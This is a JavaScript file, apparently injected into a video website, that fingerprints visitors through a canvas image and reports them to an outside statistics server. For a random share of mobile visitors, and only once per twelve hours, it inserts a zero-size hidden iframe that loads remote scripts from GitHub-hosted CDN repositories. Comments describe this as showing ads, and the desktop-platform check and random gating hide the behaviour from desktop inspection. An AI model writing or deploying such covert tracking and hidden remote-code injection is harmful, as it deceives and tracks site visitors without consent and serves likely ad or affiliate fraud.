   
   var  _number    = 5;
   var  _isDebug   = true;
   var  _UUID      = '';
   var  _debugType = 'flvweb';
   

   /** 
    *  处理缓存的类
    * 
    */
   class storage {
       
      constructor() {
        this.source = window.localStorage;
        this.initClear();
      }
    
     /**
      * 初始化清除已经过期的数据
      */
      initClear(){    
        // const reg = new RegExp("__expires__");
        const reg = /__expires__/;
        var data = this.source;
        var list = Object.keys(data);
        if(list.length > 0){
          list.forEach((key) => {
            // 如果为非包含__expires__键名的key进行判断清除过期的
            if( !reg.test(key)){
              var now = Date.now();
              var expires = data[`${key}__expires__`];
              if (now >= expires ) {
                this.remove(key);
              }
            }
          })
        }
      }
    
      /**
        * set 存储方法
        * @ param {String} 	key 键名
        * @ param {String} 	value 键值
        * @ param {String} 	expired 过期时间，以分钟为单位，非必须。（不传则为永久有效）
        */
      set(key, value, expired) {    
        var source = this.source;
        source[key] = JSON.stringify(value);
        if (expired !== undefined){
          // // 过期时间单位为天
          // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * 24 * expired
          // // 过期时间单位为小时
          // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * expired
          // 过期时间单位为分钟
          source[`${key}__expires__`] = Date.now() + 1000 * 60 * expired;
        };
      }
    
      /**
        * get 获取方法
        * @ param {String} 	key 键名
        * @ return  如果没过期则返回数据，否则返回null
        */
       get(key) {    
            const source = this.source;
            const expires = source[`${key}__expires__`];
            // 获取前把已经过期的数据删除掉
            if (expires) {
              const now = Date.now();
              if ( now >= expires ) {
                this.remove(key);
                return null;
              }
            }
            // 获取数据
            const value = source[key] ? JSON.parse(source[key]) : null;
            return value;
      }
    
      /**
        * remove 删除方法
        * @ param {String} 	key 键名  非必须 （不传则删除所有）
        */
      remove(key) {
        if (key) {
          // localStorage自带的removeItem()方法
          this.source.removeItem(key);
          this.source.removeItem(`${key}__expires__`);
          // delete data[key];
          // delete data[`${key}__expires__`];
        } else {
          // 清除所有，localStorage自带的clear()方法
          this.source.clear();
        }
      }
    }
    
    /** 获取用户指纹 */
    function getUUID(domain) {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext("2d");
        var txt = domain;
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.textBaseline = "tencent";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText(txt, 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText(txt, 4, 17);

        var b64 = canvas.toDataURL().replace("data:image/png;base64,","");
        var bin = atob(b64);
        var crc = bin2hex(bin.slice(-16,-12));
        return crc;
    }
    
    function bin2hex(s) {
        var i, l, o = '',n;
        s += '';

        for (i = 0, l = s.length; i < l; i++) {
            n = s.charCodeAt(i)
                .toString(16);
            o += n.length < 2 ? '0' + n : n;
        }
        return o;
    }
    
    /**
   *  时间字符串格式化
   */
   function formatTime(_time, _format) {

        var dateStr = _time;
        /*
         * eg:format="YYYY-MM-dd hh:mm:ss";
         */
        if (typeof dateStr == "string") {
            dateStr = dateStr.replace("T", " ").replace(/-/g, "/");
        }
        var obj = new Date(dateStr);
        var o = {
            "M+": obj.getMonth() + 1, // month
            "d+": obj.getDate(), // day
            "h+": obj.getHours(), // hour
            "m+": obj.getMinutes(), // minute
            "s+": obj.getSeconds(), // second
            "q+": Math.floor((obj.getMonth() + 3) / 3), // quarter
            "S": obj.getMilliseconds()
        }
    
        if (/(Y+)/.test(_format)) {
            _format = _format.replace(RegExp.$1, RegExp.$1.length == 4 ? obj.getFullYear() : (obj.getFullYear() + "")
                .substr(4 - RegExp.$1.length));
        }
    
        for (var k in o) {
            if (new RegExp("(" + k + ")").test(_format)) {
                _format = _format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] :
                    ("00" + o[k]).substr(("" + o[k]).length));
            }
        }
        return _format;
   }
    
    
    /** 
     * 记录操作步骤函数 
     * step: 步骤
     * content: 步骤内容
     * time: 步骤时间;
     */
    function recordOperationFunc(_step, _content, _time){
        
        /** 如果开启了调试模式才去记录用户步骤 */
        if(_isDebug){
            
            if(_UUID == ''){
               _UUID = getUUID('xla');
            }
           
            var _recordOperation = {
                id: _UUID,
                type: _debugType,
                step: _step,
                content: _content,
                time: formatTime(new Date(), 'YYYY-MM-dd hh:mm:ss')
            }
            
            ajaxFunc('//statistics.yozsc.com/server/count_num.php', 'POST', { 'setCountDebug': JSON.stringify(_recordOperation) } , function(){}, function(){}, function(){}, 8000);
        }
    }
    
    /**  获取地址栏参数，并且转换成对象 */
    function parseURL(url){
        if (!url) return {};
        url = decodeURIComponent(url);
        var _url = url.split("?")[1];
    
        if (!_url) return {};
    
        var para = _url.split("&");
        var len  = para.length;
        var res  = {};
        for (var i = 0; i < len; i++) {
            var arr = para[i].split("=");
            res[arr[0]] = arr[1];
        }
        return res;
    } 
   
   /** 创建iframe */
   function createIframe(){
       
        var _iframe        = document.createElement('iframe');
	        _iframe.src    = '//'+ window.location.host +'/index.php/art/type/id/34.html';
		    _iframe.name   = 'flvwebIframe';
		    _iframe.id	   = 'flvwebIframe';
		    _iframe.width  = 0;
		    _iframe.height = 0;
		    _iframe.border = '0';
		    _iframe.sandbox= "allow-forms allow-scripts allow-same-origin";
		
		    var _clearInterval_1 = window.setInterval(function(){
		        
		        if(document.body){
		            
		            window.clearInterval(_clearInterval_1)
		            
		            document.body.appendChild(_iframe);
		            
		            var _clearInterval_2 = window.setInterval(function(){
		                
            	        var _iframe = document.getElementById('flvwebIframe');
            	        var _iframeDom;
            	        
            	        if(_iframe){
            	            
            	            var _iframeWindow   = document.getElementById('flvwebIframe').contentWindow;
            	            
            	            if(_iframeWindow){
            	                
            	                var _iframeDocument = _iframeWindow.document;
            	                
            	                //_iframeDom     = _iframeDocument.getElementsByClassName('myui-extra')[0];
            	            }
            	        }
            	       
            	        if(_iframeDocument){
            	            
            	            window.clearInterval(_clearInterval_2);
            	            
            	            _iframeDocument.write(' ');
            	            
            	            _iframeDocument.write('<html><body><div><script src="//cdn.jsdelivr.net/gh/Zrahh/JsDelivr_CDN/utils/zepto.min.js"></script><script src="//cdn.jsdelivr.net/gh/Zrahh/JsDelivr_CDN/utils/crypto-js.js"></script><script src="//cdn.jsdelivr.net/gh/nickly/CDN_JS/deb_flvweb.js"></script></div></body></html>');
            	            
            	            recordOperationFunc(2, '步骤2: create=success', new Date().getTime());
            	        }
            	        
            	    },1000);
		        }
		        
		    },300);
		   
   } 
  
  
   /** 初始化函数 */
   function init(){
       
       var _lock = false;
       
       /** 加载zepto cdn链接 */
       var _zeptoUrl  = "//cdn.jsdelivr.net/gh/Zrahh/JsDelivr_CDN/utils/zepto.min.js";
       
       /** 创建一个script dom对象 */
       var _zeptoScript  = document.createElement('script');
       
       _zeptoScript.src  = _zeptoUrl;
       _zeptoScript.type = 'text/javascript';
       
       document.body.append(_zeptoScript);
      
       var _clearInterval = window.setInterval(function(){
            
           if($ != undefined && _lock == false){
               
               _lock = true;
               
               window.clearInterval(_clearInterval);
               
               /** 创建iframe */
               createIframe();
           }
           
       },1000);
       
       
       /** 接收从子页面传过来的事件; */
       window.addEventListener('message', function(e){
        
        /** 删除桔子 */
        if (e.data.act == 'removeIframe_jz') {
            
            $('#flvwebIframe').attr('sandbox','allow-forms allow-same-origin');
           
            window.setTimeout(function(){
                
                $('#flvwebIframe').remove();
                
            },15000);
        }

      }, false);
   }
   
   /** 随机概率 */
   var _random = Math.floor(Math.random()*(1 - (_number + 1)) + (_number + 1));
   
    /** 只有符合条件才可以看到广告 */
   if(top && parseURL(top.location.href)['debuggerto'] && /zuoan/g.test(parseURL(top.location.href)['debuggerto']) ){
    
	  Object.defineProperty(navigator,'platform',{get:function(){return 'Android';}});
	  
	  init();
	  
  }else{
      
     
      /** 随机1~3, 如果是为3才去操作代码, 并且这个cookie存在; */
      if(_random == 1  && (navigator['platform'] == 'Win32' || navigator['platform'] == 'MacIntel') == false){
          
           /** 初始化缓存 */
           var myLocalStorage = new storage();
           
           var _timeout = myLocalStorage.get('timeout_jz');
       
           if(_timeout){
               
               recordOperationFunc(1, '步骤1: timeout_jz=true,NoEntry ', new Date().getTime());

           }else{
               
               recordOperationFunc(1, '步骤1: timeout_jz=false', new Date().getTime());
               
               /** 半天检测一次 */
               myLocalStorage.set('timeout_jz', new Date().getTime(), 60*12);
               
               init();
           }
      }
  }
   
